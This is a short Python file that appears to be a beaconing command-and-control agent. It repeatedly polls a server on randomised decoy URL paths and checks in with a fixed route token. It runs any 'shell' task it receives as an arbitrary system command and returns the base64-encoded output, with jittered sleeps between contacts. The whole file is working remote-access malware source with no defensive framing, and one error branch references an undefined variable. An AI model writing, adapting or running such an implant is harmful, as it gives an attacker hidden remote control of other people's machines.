import base64
import json
import random
import requests
import subprocess
import sys
import time

from collections import namedtuple

AgentOption = namedtuple('AgentOption', ['name', 'description', 'parameters','type'])
Parameter = namedtuple('Parameter', ['name', 'description'])

routes = ['the', 'bird', 'is', 'a', 'nerd', 'd', 'juice']

def string_to_base64(data) -> str:
    """
    Base64 encode a string.
    :param data: A python string.
    :return: A base64 encoded string
    :rtype: str
    """
    return str(base64.b64encode(data.encode()), 'utf-8')

def post(data, route=''):
    if not route:
        route = routes[random.randint(0, len(routes) - 1)]
    return requests.post(f'http://127.0.0.1:8080/{route}', data).text


def main():
    batch_response = ''
    check_in_task_id = ''
    while True:
        try:
            if not check_in_task_id:
                route = 'tPgWsiyxWd'
                data = ''
            else:
                route = ''
                data = json.dumps(batch_response)
            batch_request = json.loads(post(data, route=route))
        except Exception as e:
            batch_response = [{
                "connectrpc": "0.0.0",
                "error": {
                    "code":-32700,
                    "message": string_to_base64(str(e))
                },
                "id": check_in_task_id
            }]
            time.sleep(random.randint(5, 10))
            continue

        try:
            batch_response = []
            for task in batch_request:
                id = task['id']
                name = task['name']
                parameters = task['parameters']
                results = ''
                try:
                    if name == 'check_in':
                        check_in_task_id = id
                        continue
                    if name == 'shell':
                        results = subprocess.check_output(parameters[0], stderr=subprocess.STDOUT, shell=True, encoding='UTF-8')
                    if not results:
                        batch_response.extend([{
                            "connectrpc": "0.0.0",
                            "error": {
                                "code":-32601,
                                "message": string_to_base64(str(e))
                            },
                            "id": check_in_task_id
                        }])
                    batch_response.extend([{
                        "connectrpc": "0.0.0",
                        "result": string_to_base64(results),
                        "id": id
                    }])
                    
                except Exception as e:
                    batch_response.extend([{
                        "connectrpc": "0.0.0",
                        "error": {
                            "code":-32600,
                            "message": string_to_base64(str(e))
                        },
                        "id": check_in_task_id
                    }])
        except Exception as e:
            batch_response = [{
                "connectrpc": "0.0.0",
                "error": {
                    "code":-32700,
                    "message": string_to_base64(str(e))
                },
                "id": check_in_task_id
            }]
        batch_response.extend([{
            "connectrpc": "0.0.0",
            "result": 'checking in',
            "id": check_in_task_id
        }])
        time.sleep(random.randint(5, 10))

if __name__ == '__main__':
    sys.exit(main())